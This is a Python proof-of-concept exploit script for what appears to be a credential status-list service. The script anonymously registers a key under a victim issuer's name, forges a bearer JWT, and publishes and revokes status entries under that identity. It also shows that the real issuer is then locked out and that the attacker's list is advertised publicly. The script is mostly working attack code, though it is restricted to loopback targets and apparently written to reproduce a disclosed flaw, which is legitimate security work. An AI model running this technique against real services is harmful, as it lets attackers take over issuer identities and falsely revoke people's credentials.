#!/usr/bin/env python3
"""Reproduce issuer-onboarding and management-token trust-boundary gaps.

The script uses only an isolated local target. It generates ephemeral issuer
keys, anonymously registers a victim issuer string, signs an unprofiled bearer
JWT with the matching private key, and proves that the resulting principal can
publish and update status-list state.
"""

import argparse
import base64
import gzip
import json
import subprocess
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zlib
from pathlib import Path


BASELINE = "adbe8fdacae5edb1ce655a14a5f5f2120ea229e3"
VALID = 0
INVALID = 1


class PocError(RuntimeError):
    pass


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def http_request(
    method: str,
    url: str,
    body: dict | None = None,
    headers: dict | None = None,
) -> tuple[int, dict[str, str], bytes]:
    data = None if body is None else json.dumps(body).encode("utf-8")
    request_headers = {"Content-Type": "application/json"} if body is not None else {}
    request_headers.update(headers or {})
    request = urllib.request.Request(url, data=data, method=method, headers=request_headers)
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return (
                response.status,
                {key.lower(): value for key, value in response.headers.items()},
                response.read(),
            )
    except urllib.error.HTTPError as error:
        return (
            error.code,
            {key.lower(): value for key, value in error.headers.items()},
            error.read(),
        )
    except urllib.error.URLError as error:
        raise PocError(f"request to {url} failed: {error}") from error


def require_status(actual: int, expected: int, operation: str, body: bytes) -> None:
    if actual != expected:
        detail = body.decode("utf-8", errors="replace")
        raise PocError(f"{operation} returned HTTP {actual}, expected {expected}: {detail}")


def require_loopback_url(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "localhost", "::1"}:
        raise PocError(f"refusing non-loopback or non-HTTP target: {url}")
    return url.rstrip("/")


def wait_for_health(base_url: str, timeout: float = 120.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            status, _, _ = http_request("GET", f"{base_url}/health")
            if status == 200:
                return
        except PocError:
            pass
        time.sleep(1.0)
    raise PocError(f"target did not become healthy within {timeout:.0f} seconds")


def read_der_length(data: bytes, offset: int) -> tuple[int, int]:
    first = data[offset]
    offset += 1
    if first < 0x80:
        return first, offset
    count = first & 0x7F
    if count == 0 or count > 4 or offset + count > len(data):
        raise PocError("unsupported DER length in OpenSSL signature")
    return int.from_bytes(data[offset : offset + count], "big"), offset + count


def read_der_integer(data: bytes, offset: int) -> tuple[int, int]:
    if offset >= len(data) or data[offset] != 0x02:
        raise PocError("invalid ECDSA DER integer")
    length, start = read_der_length(data, offset + 1)
    end = start + length
    if end > len(data):
        raise PocError("truncated ECDSA DER integer")
    return int.from_bytes(data[start:end], "big"), end


def ecdsa_der_to_raw(signature: bytes) -> bytes:
    if not signature or signature[0] != 0x30:
        raise PocError("OpenSSL returned a non-SEQUENCE ECDSA signature")
    length, offset = read_der_length(signature, 1)
    if offset + length != len(signature):
        raise PocError("invalid ECDSA DER sequence length")
    r, offset = read_der_integer(signature, offset)
    s, offset = read_der_integer(signature, offset)
    if offset != len(signature) or r.bit_length() > 256 or s.bit_length() > 256:
        raise PocError("invalid P-256 ECDSA signature")
    return r.to_bytes(32, "big") + s.to_bytes(32, "big")


class EphemeralKey:
    def __init__(self, directory: Path, label: str):
        self.key_path = directory / f"{label}-key.pem"
        generated = subprocess.run(
            [
                "openssl",
                "genpkey",
                "-algorithm",
                "EC",
                "-pkeyopt",
                "ec_paramgen_curve:P-256",
                "-out",
                str(self.key_path),
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        if generated.returncode != 0:
            raise PocError(f"OpenSSL key generation failed: {generated.stderr.strip()}")

        exported = subprocess.run(
            ["openssl", "pkey", "-in", str(self.key_path), "-pubout", "-outform", "DER"],
            capture_output=True,
            check=False,
        )
        if exported.returncode != 0:
            raise PocError(f"OpenSSL public-key export failed: {exported.stderr.decode().strip()}")
        if len(exported.stdout) < 65 or exported.stdout[-65] != 0x04:
            raise PocError("unexpected OpenSSL P-256 public-key encoding")
        point = exported.stdout[-64:]
        self.jwk = {
            "kty": "EC",
            "crv": "P-256",
            "x": b64url_encode(point[:32]),
            "y": b64url_encode(point[32:]),
        }

    def management_token(self, issuer: str) -> str:
        header = {"alg": "ES256", "typ": "unrelated+jwt"}
        claims = {"iss": issuer, "exp": int(time.time()) + 3600}
        signing_input = ".".join(
            b64url_encode(json.dumps(value, separators=(",", ":")).encode("utf-8"))
            for value in (header, claims)
        ).encode("ascii")
        signed = subprocess.run(
            ["openssl", "dgst", "-sha256", "-sign", str(self.key_path)],
            input=signing_input,
            capture_output=True,
            check=False,
        )
        if signed.returncode != 0:
            raise PocError(f"OpenSSL signing failed: {signed.stderr.decode().strip()}")
        return signing_input.decode("ascii") + "." + b64url_encode(
            ecdsa_der_to_raw(signed.stdout)
        )


def token_claim_keys(token: str) -> list[str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise PocError("generated bearer token is not a compact JWT")
    return sorted(json.loads(b64url_decode(parts[1])).keys())


def decode_status(headers: dict[str, str], body: bytes, index: int) -> int:
    if headers.get("content-encoding", "").lower() == "gzip" or body.startswith(b"\x1f\x8b"):
        body = gzip.decompress(body)
    parts = body.decode("utf-8").split(".")
    if len(parts) != 3:
        raise PocError("status response is not a compact JWT")
    claims = json.loads(b64url_decode(parts[1]))
    status_list = claims["status_list"]
    bits = int(status_list["bits"])
    raw = zlib.decompress(b64url_decode(status_list["lst"]))
    value = 0
    for bit in range(bits):
        position = index * bits + bit
        if position // 8 >= len(raw):
            raise PocError(f"status index {index} exceeds the decoded list")
        value |= ((raw[position // 8] >> (position % 8)) & 1) << bit
    return value


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:18007")
    parser.add_argument(
        "--confirm-disposable-target",
        action="store_true",
        help="required acknowledgement that all writes target a disposable local stack",
    )
    args = parser.parse_args()
    if not args.confirm_disposable_target:
        parser.error("--confirm-disposable-target is required before any write")

    base_url = require_loopback_url(args.base_url)
    wait_for_health(base_url)

    with tempfile.TemporaryDirectory(prefix="status-list-auth-poc-") as temp_dir:
        directory = Path(temp_dir)
        attacker_key = EphemeralKey(directory, "attacker")
        legitimate_key = EphemeralKey(directory, "legitimate")
        victim_issuer = f"https://victim.example/issuer/{uuid.uuid4()}"
        list_id = str(uuid.uuid4())

        status, _, body = http_request(
            "POST",
            f"{base_url}/api/v1/credentials",
            {"issuer": victim_issuer, "public_key": attacker_key.jwk},
        )
        require_status(status, 202, "anonymous first-writer credential registration", body)
        print("[1/5] Anonymous issuer onboarding accepted: HTTP 202")

        token = attacker_key.management_token(victim_issuer)
        claim_keys = token_claim_keys(token)
        if claim_keys != ["exp", "iss"]:
            raise PocError(f"unexpected management-token claims: {claim_keys}")

        auth = {"Authorization": f"Bearer {token}"}
        status, _, body = http_request(
            "PUT",
            f"{base_url}/api/v1/status-lists/{list_id}/statuses",
            {"statuses": [{"index": 0, "status": VALID}]},
            auth,
        )
        require_status(status, 201, "publish with anonymously registered key", body)
        print('[2/5] Unprofiled bearer token accepted for publish: claims=["exp", "iss"]; HTTP 201')

        status, _, body = http_request(
            "PATCH",
            f"{base_url}/api/v1/status-lists/{list_id}/statuses",
            {"statuses": [{"index": 0, "status": INVALID}]},
            auth,
        )
        require_status(status, 200, "update with same unprofiled bearer token", body)
        print("[3/5] Same bearer token accepted for update scope: HTTP 200")

        status, headers, body = http_request(
            "GET",
            f"{base_url}/api/v1/status-lists/{list_id}",
            headers={"Accept": "application/statuslist+jwt"},
        )
        require_status(status, 200, "public readback of attacker-managed list", body)
        if decode_status(headers, body, 0) != INVALID:
            raise PocError("public readback did not show the attacker-controlled update")

        status, _, body = http_request(
            "POST",
            f"{base_url}/api/v1/credentials",
            {"issuer": victim_issuer, "public_key": legitimate_key.jwk},
        )
        require_status(status, 409, "second registration for the same issuer", body)
        print("[4/5] Later conflicting issuer registration is locked out: HTTP 409")

        status, _, body = http_request("GET", f"{base_url}/api/v1/aggregation")
        require_status(status, 200, "public aggregation", body)
        aggregation = json.loads(body.decode("utf-8"))
        listed = any(list_id in uri for uri in aggregation.get("status_lists", []))
        if not listed:
            raise PocError("public aggregation did not include the attacker-created status list")
        print("[5/5] Public aggregation advertises the attacker-created list: HTTP 200")

    print(f"\nRESULT: tenant trust-boundary failures reproduced at baseline {BASELINE}")


if __name__ == "__main__":
    try:
        main()
    except (OSError, PocError, subprocess.SubprocessError) as error:
        raise SystemExit(f"PoC failed: {error}") from error
